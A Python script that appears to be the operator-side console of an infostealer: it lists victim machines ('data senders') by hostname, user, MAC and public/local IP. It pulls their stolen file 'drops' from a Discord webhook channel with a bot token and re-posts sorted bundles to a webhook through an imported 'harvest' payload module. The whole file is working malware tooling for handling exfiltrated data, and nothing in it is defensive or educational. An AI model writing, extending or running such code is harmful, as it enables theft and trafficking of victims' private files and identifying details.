"""sender_send.py - PC-wise sender picker for the quick menu.

Lists every data sender seen in the webhook channel / local cache, sorted by
PC/user, then posts the selected sender's cached drops back to the webhook as
a clean sorted bundle.

    python sender_send.py --list
    python sender_send.py --list --refresh
    python sender_send.py --refresh --sender 2
    python sender_send.py --sender all --dry
"""

from __future__ import annotations

import argparse
import shutil
import sys
import time
from pathlib import Path

ROOT = Path(__file__).resolve().parent
sys.path.insert(0, str(ROOT))
sys.path.insert(0, str(ROOT / "payload"))

import harvest  # noqa: E402
import senders  # noqa: E402

try:
    import send as _send_cfg
    DEFAULT_WEBHOOK = _send_cfg.WEBHOOK
except Exception:
    DEFAULT_WEBHOOK = ""

OUT = ROOT / "sorted_senders"
MAX_FILES_PER_POST = 5


def line(ch: str = "-", n: int = 66) -> None:
    print(ch * n)


def ok(text: str) -> None:
    print("  [OK]  " + text)


def bad(text: str) -> None:
    print("  [!!]  " + text)


def info(text: str) -> None:
    print("        " + text)


def safe_name(value: str) -> str:
    cleaned = "".join(ch if ch.isalnum() or ch in "._-" else "_"
                      for ch in str(value or "")).strip("._")
    return cleaned[:100] or "file.bin"


def slug(value: str) -> str:
    cleaned = "".join(ch if ch.isalnum() else "-" for ch in str(value or ""))
    return "-".join(part for part in cleaned.casefold().split("-") if part)[:60] or "sender"


def download_item(record: dict, item: dict) -> Path | None:
    url = str(item.get("url") or "")
    path = Path(str(item.get("path") or "")) if item.get("path") else None
    if path is not None and path.is_file():
        return path
    if not url:
        return None
    folder = senders.INBOX / safe_name(str(record.get("message_id") or "msg"))
    path = folder / safe_name(str(item.get("name") or "attachment.bin"))
    try:
        senders._download(url, path)
    except Exception as exc:
        bad("attachment download fail: " + str(item.get("name")) + " - " + repr(exc))
        return None
    item["path"] = str(path)
    return path


def gather(picked: list[dict]) -> tuple[list[tuple[str, bytes]], dict[str, list[str]]]:
    """Collect cached attachments into sorted, uniquely named file pairs."""
    files: list[tuple[str, bytes]] = []
    seen_paths: set[str] = set()
    manifest: dict[str, list[str]] = {}

    for row in picked:
        sender_dir = OUT / slug(row["display"] + "-" + row["key"])
        sender_dir.mkdir(parents=True, exist_ok=True)
        names: list[str] = []
        prefix = safe_name(row["display"]).replace("\\", "_")

        for record in senders.records_for(row):
            for item in record.get("files") or []:
                if not isinstance(item, dict):
                    continue
                path = download_item(record, item)
                if path is None or not path.is_file():
                    continue
                marker = str(path.resolve())
                if marker in seen_paths:
                    continue
                seen_paths.add(marker)
                try:
                    blob = path.read_bytes()
                except OSError:
                    continue
                name = prefix + "__" + safe_name(str(item.get("name") or path.name))
                files.append((name, blob))
                names.append(name)
                try:
                    shutil.copyfile(path, sender_dir / name)
                except OSError:
                    pass

        index = [
            "DATA SENDER",
            "=" * 48,
            "pc      : " + str(row["host"]),
            "user    : " + str(row["user"] or "-"),
            "mac     : " + str(row["mac"] or "-"),
            "public  : " + str(row["public_ip"] or "-"),
            "local   : " + str(row["local_ip"] or "-"),
            "label   : " + str(row["label"] or "-"),
            "drops   : " + str(row["drop_count"]),
            "last    : " + str(row["last"] or "-"),
            "sources : " + ", ".join(sorted(row["sources"])),
            "",
            "FILES",
            "=" * 48,
        ]
        index += sorted(names)
        (sender_dir / "00_SENDER.txt").write_text("\n".join(index) + "\n",
                                                  encoding="utf-8")
        manifest[row["id"]] = names

    files.sort(key=lambda pair: pair[0].casefold())
    return files, manifest


def chunks(values: list[tuple[str, bytes]], size: int):
    for start in range(0, len(values), size):
        yield values[start:start + size]


def post(webhook: str, picked: list[dict], files: list[tuple[str, bytes]],
         dry: bool) -> bool:
    names = [row["display"] for row in picked]
    stamp = time.strftime("%Y%m%d-%H%M%S")
    label = "sender-" + slug("+".join(names))
    payload = {
        "phase": "sorted-sender",
        "label": label,
        "senders": names,
        "sender_count": len(picked),
        "drop_count": sum(row["drop_count"] for row in picked),
        "time": stamp,
    }

    print()
    line()
    print("  SORTED SENDER DROP")
    line()
    info("senders: " + " | ".join(names))
    info("files   : " + str(len(files)))
    info("bytes   : " + str(round(sum(len(blob) for _, blob in files) / 1048576, 2)) + " MB")
    if not files:
        bad("is sender ke liye koi cached attachment nahi mila")
        return False
    if dry:
        ok("DRY RUN - kuch nahi bheja")
        for name, blob in files[:20]:
            info("  " + name + "  (" + str(round(len(blob) / 1024, 1)) + " KB)")
        return True

    batches = list(chunks(files, MAX_FILES_PER_POST))
    landed = True
    for number, batch in enumerate(batches, 1):
        meta = dict(payload, batch=f"{number}/{len(batches)}")
        if not harvest._ship(webhook, meta, batch):
            bad("batch " + str(number) + " nahi gaya: " +
                str(getattr(harvest, "_LAST_ERROR", "")))
            landed = False
        else:
            ok("batch " + str(number) + "/" + str(len(batches)) + " bhej diya")
    return landed


def main() -> int:
    try:
        sys.stdout.reconfigure(encoding="utf-8", errors="replace")
    except Exception:
        pass

    parser = argparse.ArgumentParser()
    parser.add_argument("--webhook", default=None)
    parser.add_argument("--sender", "--user", dest="sender", default=None,
                        help="sender number, comma separated, or all")
    parser.add_argument("--list", action="store_true")
    parser.add_argument("--refresh", action="store_true")
    parser.add_argument("--no-refresh", action="store_true")
    parser.add_argument("--dry", action="store_true")
    parser.add_argument("--limit", type=int, default=100)
    parser.add_argument("--token", default=None,
                        help="Discord bot token (optional if discord_read.json set)")
    args = parser.parse_args()

    webhook = (args.webhook or DEFAULT_WEBHOOK or "").strip()
    refresh = args.refresh or (not args.no_refresh and
                               bool(senders.bot_tokens(args.token)))
    rows = senders.discover(refresh=refresh, webhook=webhook,
                            token=args.token, limit=args.limit)

    print()
    line("=")
    print("  DATA SENDERS - PC-wise sorted" + ("  [LIVE]" if refresh else "  [CACHE]"))
    line("=")
    print(senders.table(rows))
    print()
    if not rows:
        bad("abhi koi data sender nahi mila")
        info("bot token ke saath --refresh chalao, ya phir pehle drop aane do")
        return 1
    if args.list:
        return 0

    try:
        picked = senders.choose(rows, args.sender)
    except ValueError as exc:
        bad(str(exc))
        return 1
    if not picked:
        bad("koi sender select nahi hua")
        return 1

    files, _ = gather(picked)
    ok("sorted folder: " + str(OUT))
    sent = post(webhook, picked, files, args.dry)
    return 0 if sent else 1


if __name__ == "__main__":
    raise SystemExit(main())
